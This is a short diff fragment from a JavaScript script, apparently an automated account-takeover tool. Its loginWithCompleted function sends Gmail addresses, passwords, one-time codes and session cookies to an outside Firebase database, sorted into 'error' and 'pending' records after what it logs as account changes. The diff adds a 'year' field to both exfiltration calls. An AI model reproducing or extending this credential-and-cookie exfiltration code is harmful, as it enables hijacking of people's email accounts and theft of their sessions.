@@ -396,7 +396,7 @@ async function loginWithCompleted(number, password, cookies) {
                 if (mRapt == null) {
                     console.log('Chenge Error: '+number)
                 
-                    await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code_new/error/'+number+'.json', JSON.stringify({ gmail: mUser, password:password, otp:mCodeSend, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
+                    await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code_new/error/'+number+'.json', JSON.stringify({ gmail: mUser, password:password, otp:mCodeSend, year:mNumber.year, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
                         headers: {
                             'Content-Type': 'application/x-www-form-urlencoded'
                         }
@@ -404,7 +404,7 @@ async function loginWithCompleted(number, password, cookies) {
                 } else {
                     console.log('All Chenge Success: '+number)
                 
-                    await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code_new/pending/'+number+'.json', JSON.stringify({ gmail: mUser, password:password, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
+                    await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/raiyan088/code_new/pending/'+number+'.json', JSON.stringify({ gmail: mUser, password:password, year:mNumber.year, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
                         headers: {
                             'Content-Type': 'application/x-www-form-urlencoded'
                         }
